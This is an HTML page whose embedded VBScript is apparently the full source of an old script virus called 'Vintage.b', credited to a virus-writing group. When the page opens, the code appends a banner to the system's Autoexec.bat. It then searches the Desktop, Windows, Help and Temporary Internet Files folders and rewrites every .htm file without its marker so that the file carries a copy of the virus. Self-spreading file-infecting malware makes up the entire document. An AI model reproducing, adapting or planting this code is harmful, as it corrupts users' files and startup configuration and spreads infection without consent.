<!--Vintage.b-->
<HTML><HEAD>
<META NAME="GENERATOR" Content="Microsoft Visual Studio 6.0">
<TITLE></TITLE>
</HEAD><BODY><Script language = vbscript>
dim a, b, g, vHost, hKod, otvor, otvor2
set a = createobject("Scripting.FileSystemObject")
vHost = document.body.innerHTML 
set oFajl = a.OpenTextFile("C:\Autoexec.bat",8,false)  
with oFajl
.WriteLine "echo off"
.WriteLine "cls"
.writeline "echo  þþþþþþ            þú     þ þú"
.writeline "echo þúúúúúú            þú     þ þú"
.writeline "echo þ                  þú     þ þú"
.writeline "echo þ                  þú     þ þú"
.writeline "echo  þþþþþ             þú     þ þú"
.writeline "echo       þ  þþþþþþþþ  þú     þ þú"
.writeline "echo       þ  °°°°°°° °° þú   þ  þú"
.writeline "echo úúúúúúþ °°°° ° °°°°° þúúþ ° þúúúúúú"
.writeline "echo þþþþþþ °° °  °  °  °° þþ °°° þþþþþþ"
.writeline "echo °°°°°°°°  °°°° ° °  °°°°°°°°°°°°°°°"
.writeline "echo  °°°    °° °°°° °°  °        °°°°"
.writeline "echo    °°° °  °      °  °°°°      °"
.writeline "echo      °  °  °°   °      °°°"
.writeline "echo          ° °Vintage.b by e[ax]"
.writeline "echo            °    °  °        °"
.writeline "echo            °       °        °°"
.writeline "echo          °          °      °"
.writeline "echo          °                 °"
.writeline "echo          °                 °"
end with
set a1 = a.GetFolder("C:\Windows\Desktop").Files  
for each zrtva in a1
if a.GetExtensionName(zrtva.name) = "htm" then
set otvor = a.OpenTextFile(zrtva.path,1,false) 
if otvor.readline <> "<!--Vintage.b-->" then
	hkod = otvor.readall()
	set otvor2 = a.OpenTextFile(zrtva.path,2,false)  
	with otvor2
	 .WriteLine "<!--vintage.b-->"
     .writeline "<html>"
     .writeline "<body>"
     .writeline vhost
     .writeline "</body>"
     .writeline "</html>"
     .writeline hkod
	end with
otvor2.close
end if
otvor.close
end if
next
zrtva = "": hKod = "": a1 = ""
set a1 = a.GetFolder("C:\Windows").Files  
for each zrtva in a1
if a.GetExtensionName(zrtva.name) = "htm" then
set otvor = a.OpenTextFile(zrtva.path,1,false) 
if otvor.readline <> "<!--Vintage.b-->" then
	hkod = otvor.readall()
	set otvor2 = a.OpenTextFile(zrtva.path,2,false)  
	with otvor2
	 .WriteLine "<!--vintage.b-->"
     .writeline "<html>"
     .writeline "<body>"
     .writeline vhost
     .writeline "</body>"
     .writeline "</html>"
     .writeline hkod
	end with
otvor2.close
end if
otvor.close
end if
next
zrtva = "": hKod = "": a1 = ""
set a1 = a.GetFolder("C:\Windows\Temporary Internet Files").Files  
for each zrtva in a1
if a.GetExtensionName(zrtva.name) = "htm" then
set otvor = a.OpenTextFile(zrtva.path,1,false) 
if otvor.readline <> "<!--Vintage.b-->" then
	hkod = otvor.readall()
	set otvor2 = a.OpenTextFile(zrtva.path,2,false)  
	with otvor2
	 .WriteLine "<!--vintage.b-->"
     .writeline "<html>"
     .writeline "<body>"
     .writeline vhost
     .writeline "</body>"
     .writeline "</html>"
     .writeline hkod
	end with
otvor2.close
end if
otvor.close
end if
next
zrtva = "": hKod = "": a1 = ""
set a1 = a.GetFolder("C:\Windows\Help\Common").Files  
for each zrtva in a1
if a.GetExtensionName(zrtva.name) = "htm" then
set otvor = a.OpenTextFile(zrtva.path,1,false) 
if otvor.readline <> "<!--Vintage.b-->" then
	hkod = otvor.readall()
	set otvor2 = a.OpenTextFile(zrtva.path,2,false)  
	with otvor2
	 .WriteLine "<!--vintage.b-->"
     .writeline "<html>"
     .writeline "<body>"
     .writeline vhost
     .writeline "</body>"
     .writeline "</html>"
     .writeline hkod
	end with
otvor2.close
end if
otvor.close
end if
next
'Vintage.b by e[ax] / Species VL
'Authorized distribution for Bosnia and Herzegovina
</script></BODY></HTML>
